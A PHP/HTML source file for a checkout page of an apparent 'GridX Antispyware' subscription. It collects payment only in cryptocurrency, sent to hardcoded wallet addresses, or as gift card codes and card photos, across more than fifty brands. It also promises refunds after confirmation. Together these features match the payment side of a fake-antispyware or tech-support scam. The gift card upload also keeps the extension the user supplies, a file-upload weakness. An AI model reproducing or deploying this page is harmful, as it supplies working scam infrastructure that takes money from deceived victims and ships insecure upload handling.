<?php
require_once __DIR__ . '/config.php';
login_required();

$db      = get_db();
$user_id = $_SESSION['user_id'];
$id      = (int)($_GET['id'] ?? 0);

// Fetch subscription
$st = $db->prepare('SELECT * FROM antispyware_subscriptions WHERE id=? AND user_id=?');
$st->execute([$id, $user_id]);
$sub = $st->fetch();
if (!$sub) redirect('/antispyware.php');
if ($sub['is_approved'] !== 'initialize') redirect('/dashboard.php');

// Crypto prices
function as_get_crypto_prices(): array {
    $cache_file = sys_get_temp_dir() . '/gridx_crypto_cache.json';
    if (file_exists($cache_file) && (time() - filemtime($cache_file)) < 300)
        return json_decode(file_get_contents($cache_file), true);
    $url = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,litecoin&vs_currencies=usd';
    $ctx = stream_context_create(['http'=>['timeout'=>10]]);
    $data = @file_get_contents($url, false, $ctx);
    if ($data) { file_put_contents($cache_file, $data); return json_decode($data, true); }
    return ['bitcoin'=>['usd'=>60000],'ethereum'=>['usd'=>3000],'tether'=>['usd'=>1],'litecoin'=>['usd'=>80]];
}
function as_convert(float $usd): array {
    $p = as_get_crypto_prices();
    return [
        'BTC'  => round($usd / $p['bitcoin']['usd'],  8),
        'ETH'  => round($usd / $p['ethereum']['usd'], 8),
        'USDT' => round($usd / $p['tether']['usd'],   2),
        'LTC'  => round($usd / $p['litecoin']['usd'], 8),
    ];
}

// Handle POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    verify_csrf();
    $method = $_POST['payment_method'] ?? '';

    if ($method === 'Crypto') {
        $db->prepare('UPDATE antispyware_subscriptions SET payment_method=?,network=?,address_sent=?,crypto_amount=?,is_approved="pending" WHERE id=?')
           ->execute([$method, $_POST['network']??null, $_POST['address_sent']??null, $_POST['crypto_ammount']??null, $id]);
        set_flash('success', 'Your payment has been submitted and is awaiting confirmation.');
        redirect('/antispyware_awaiting.php?id=' . $id);

    } elseif ($method === 'Gift Card') {
        $db->prepare('UPDATE antispyware_subscriptions SET payment_method=?,gift_code=?,is_approved="pending" WHERE id=?')
           ->execute([$method, $_POST['gift_code']??null, $id]);

        if (isset($_FILES['gift_card_image']) && $_FILES['gift_card_image']['error'] === UPLOAD_ERR_OK) {
            $file = $_FILES['gift_card_image'];
            if (in_array(mime_content_type($file['tmp_name']), ['image/jpeg','image/png','image/webp','image/gif'])) {
                $dir = __DIR__ . '/static/images/giftcards';
                if (!is_dir($dir)) mkdir($dir, 0755, true);
                $ext = pathinfo($file['name'], PATHINFO_EXTENSION) ?: 'jpg';
                $fn  = 'asgc_' . $user_id . '_' . $id . '_' . time() . '.' . $ext;
                move_uploaded_file($file['tmp_name'], $dir . '/' . $fn);
            }
        }
        set_flash('success', 'Gift card received. Awaiting admin verification.');
        redirect('/antispyware_awaiting.php?id=' . $id);
    }
}

$amount = (float)$sub['amount'];
$crypto = as_convert($amount);
$btc_address  = get_payment_setting('btc_address',  'bc1qvatednkwp0m5rjzpftzrrgmjf8wsw5ze98f4xe');
$btc_qr       = get_payment_setting('btc_qr',       '/static/images/btc.jpeg');
$eth_address  = get_payment_setting('eth_address',  '0xF674e23db956A1830Cb6b42b712e84470D1A0971');
$eth_qr       = get_payment_setting('eth_qr',       '/static/images/eth.jpeg');
$usdt_address = get_payment_setting('usdt_address', '0xF674e23db956A1830Cb6b42b712e84470D1A0971');
$usdt_qr      = get_payment_setting('usdt_qr',      '/static/images/usdt.jpeg');
$ltc_address  = get_payment_setting('ltc_address',  'ltc1qnj03x0a6r77sz9a8d4aauwsrawe6u8tcv4d6u9');
$ltc_qr       = get_payment_setting('ltc_qr',       '/static/images/ltc.jpeg');

$GIFT_CARDS = ['apple','itunes','google_play','amazon','steam','playstation','xbox','nintendo',
               'roblox','riot_games','blizzard','epic_games','ea_play','netflix','spotify',
               'youtube','hulu','disney_plus','uber','uber_eats','doordash','grubhub',
               'airbnb','booking','expedia','visa','mastercard','american_express','vanilla',
               'one4all','walmart','target','best_buy','ebay','costco','ikea','nike','adidas',
               'zara','hm','macys','starbucks','mcdonalds','kfc','subway','chipotle',
               'sephora','ulta','playstore','google','cashapp','paypal','razergold','paysafecard'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Antispyware Checkout | GridX</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="<?= asset_url('/static/styles/checkout.css') ?>">
    <script src="<?= asset_url('/static/scripts/checkout.js') ?>" defer></script>
    <style>
    .plan-summary-bar{background:linear-gradient(135deg,#1e2f6f,#2d44a0);color:#fff;border-radius:14px;padding:1rem 1.3rem;margin-bottom:1.4rem;display:flex;align-items:center;gap:12px;box-shadow:0 4px 16px rgba(30,47,111,.25);}
    .plan-summary-bar i{font-size:1.6rem;}
    .plan-summary-bar .plan-name{font-weight:700;font-size:1rem;}
    .plan-summary-bar .plan-price{font-size:1.35rem;font-weight:700;}
    .plan-summary-bar .plan-note{font-size:.78rem;color:rgba(255,255,255,.78);}
    </style>
</head>
<body>
<div class="container">
    <a href="/antispyware.php">« Back to Plans</a>
    <h1 class="page-title">Antispyware Subscription Checkout</h1>

    <!-- Plan summary -->
    <div class="plan-summary-bar">
        <i class="fa-solid fa-shield-check"></i>
        <div>
            <div class="plan-name"><?= e($sub['plan_label']) ?> Plan</div>
            <div class="plan-price">$<?= number_format($amount, 2) ?></div>
            <div class="plan-note"><i class="fa-solid fa-rotate-left"></i> Refundable after successful subscription confirmation</div>
        </div>
    </div>

    <form action="/antispyware_checkout.php?id=<?= $id ?>" method="post" enctype="multipart/form-data" class="checkout-grid">
        <?= csrf_field() ?>

        <!-- LEFT -->
        <div class="left-panel">
            <div class="tabs">
                <button class="tab active" type="button" data-tab="crypto">Crypto</button>
                <button class="tab" type="button" data-tab="gift">Gift Card</button>
            </div>

            <!-- CRYPTO -->
            <div class="tab-content active" id="crypto">
                <input type="hidden" name="payment_method" value="Crypto" class="payment-method-hidden">
                <h3>Pay with Cryptocurrency</h3>
                <select name="network" onchange="updateCryptoDisplay(this.value)">
                    <option value="BTC">Bitcoin (BTC)</option>
                    <option value="ETH">Ethereum (ETH)</option>
                    <option value="USDT">USDT (ERC-20)</option>
                    <option value="LTC">Litecoin (LTC)</option>
                </select>
                <div class="crypto-display" id="cryptoDisplay">
                    <div class="amount-due">
                        <span>Amount Due:</span>
                        <strong id="cryptoAmount"><?= $crypto['BTC'] ?> BTC</strong>
                    </div>
                    <div class="wallet-address">
                        <label>Send to wallet:</label>
                        <div class="address-box">
                            <span id="walletAddress"><?= e($btc_address) ?></span>
                            <button type="button" onclick="copyAddress()"><i class="fa-solid fa-copy"></i></button>
                        </div>
                    </div>
                    <div class="qr-wrap">
                        <img id="qrCode" src="<?= e($btc_qr) ?>" alt="QR Code">
                    </div>
                </div>
                <input type="hidden" name="address_sent" id="addressSent" value="<?= e($btc_address) ?>">
                <input type="hidden" name="crypto_ammount" id="cryptoAmountHidden" value="<?= $crypto['BTC'] ?> BTC">
                <button type="submit" class="pay-btn">Confirm Payment</button>
            </div>

            <!-- GIFT CARD -->
            <div class="tab-content" id="gift">
                <input type="hidden" name="payment_method" value="Gift Card" class="payment-method-hidden">
                <h3>Pay with Gift Card</h3>
                <select name="gift_type">
                    <?php foreach ($GIFT_CARDS as $gc): ?>
                    <option value="<?= $gc ?>"><?= ucfirst(str_replace('_',' ',$gc)) ?></option>
                    <?php endforeach; ?>
                </select>
                <input name="gift_code" type="text" placeholder="Enter gift card code">
                <div style="margin-top:14px;padding:14px;background:rgba(0,0,0,.04);border-radius:10px;border:1px dashed #bbb;">
                    <label style="display:block;font-weight:600;margin-bottom:7px;font-size:.88rem;">
                        📎 Upload Gift Card Image <span style="color:#888;font-weight:400;">(optional)</span>
                    </label>
                    <input type="file" name="gift_card_image" accept="image/*" style="width:100%;font-size:.88rem;">
                </div>
                <button type="submit" class="pay-btn">Submit Gift Card</button>
            </div>
        </div>

        <!-- RIGHT -->
        <div class="right-panel">
            <div class="order-summary">
                <h3>Order Summary</h3>
                <div class="summary-row"><span>Plan</span><strong><?= e($sub['plan_label']) ?></strong></div>
                <div class="summary-row"><span>Duration</span><strong><?= e($sub['duration']) ?></strong></div>
                <div class="summary-row total"><span>Total</span><strong>$<?= number_format($amount, 2) ?></strong></div>
                <div class="refund-note"><i class="fa-solid fa-rotate-left"></i> Refundable after confirmation</div>
            </div>
        </div>
    </form>
</div>

<script>
const cryptoData = {
    BTC:  { amount: '<?= $crypto['BTC'] ?> BTC',  address: '<?= e($btc_address)  ?>', qr: '<?= e($btc_qr)  ?>' },
    ETH:  { amount: '<?= $crypto['ETH'] ?> ETH',  address: '<?= e($eth_address)  ?>', qr: '<?= e($eth_qr)  ?>' },
    USDT: { amount: '<?= $crypto['USDT'] ?> USDT', address: '<?= e($usdt_address) ?>', qr: '<?= e($usdt_qr) ?>' },
    LTC:  { amount: '<?= $crypto['LTC'] ?> LTC',  address: '<?= e($ltc_address)  ?>', qr: '<?= e($ltc_qr)  ?>' },
};
function updateCryptoDisplay(network) {
    const d = cryptoData[network];
    document.getElementById('cryptoAmount').textContent = d.amount;
    document.getElementById('walletAddress').textContent = d.address;
    document.getElementById('addressSent').value = d.address;
    document.getElementById('cryptoAmountHidden').value = d.amount;
    document.getElementById('qrCode').src = d.qr;
}
function copyAddress() {
    const addr = document.getElementById('walletAddress').textContent;
    navigator.clipboard.writeText(addr).then(() => alert('Address copied!'));
}
// Tab switching — only in the active form section
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() {
        const parent = this.closest('.checkout-grid') || document;
        parent.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        parent.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        this.classList.add('active');
        parent.querySelector('#' + this.dataset.tab).classList.add('active');
        // Update hidden payment method
        parent.querySelectorAll('.payment-method-hidden').forEach(h => h.disabled = true);
        const active = parent.querySelector('.tab-content.active input[name="payment_method"]');
        if (active) active.disabled = false;
    });
});
</script>
</body>
</html>
